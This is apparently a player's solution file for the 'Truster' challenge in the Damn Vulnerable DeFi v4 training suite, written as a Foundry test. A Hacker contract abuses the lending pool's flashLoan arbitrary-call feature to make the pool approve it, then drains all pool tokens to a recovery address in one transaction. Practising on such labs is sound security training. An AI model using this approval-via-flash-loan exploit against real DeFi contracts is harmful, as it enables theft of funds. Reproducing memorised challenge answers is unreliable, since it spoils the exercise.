// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Hacker {
    constructor(
        address recovery,
        DamnValuableToken token,
        TrusterLenderPool lender,
        uint256 amount
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );
        // console.log("Will call thing;");
        lender.flashLoan(0, address(this), address(token), data);
        // console.log("Thing returned. Lender has: ", token.balanceOf(address(lender)));
        // console.log("STEALING:                   ", amount);
        token.transferFrom(address(lender), recovery, amount);
        // console.log("Stolen;");
    }
}

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // console.log("setUp function: ", msg.sender);
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // solution 1 (not working - not designed to work).
        //  bytes memory data = abi.encodeWithSignature("receivedLoan()");
        //  pool.flashLoan(TOKENS_IN_POOL, address(this), address(this), data);
        //  console.log("Function done");

        // Solution2: we can spend POOL tokens. Doesn't work, assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // console.log("Should call against: ", address(token));
        // bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, type(uint256).max);
        // pool.flashLoan(0, player, address(token), data);
        // // uint256 amount, address borrower, address target, bytes calldata data
        // console.log("Loan OK, time to steal.");
        // token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);

        Hacker h = new Hacker(recovery, token, pool, TOKENS_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
